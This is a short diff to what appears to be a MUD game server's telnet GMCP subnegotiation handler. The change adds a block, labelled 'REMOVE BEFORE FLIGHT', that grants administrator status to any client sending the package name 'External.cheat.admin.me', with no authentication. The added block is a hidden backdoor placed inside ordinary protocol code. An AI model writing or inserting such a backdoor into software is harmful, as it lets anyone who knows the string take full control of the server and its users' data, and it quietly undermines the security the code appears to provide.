@@ -201,6 +201,11 @@ static void telnet_subnegotiation(string subnegotiation) {
       player->die();
       return;
     }
+    /* REMOVE BEFORE FLIGHT */
+    if (gmcp_package == "External.cheat.admin.me") {
+      auto_admin = 1;
+      return;
+    }
     
     if (gmcp_package == "Core.Hello") { /* process Core.Hello */
       string rc;
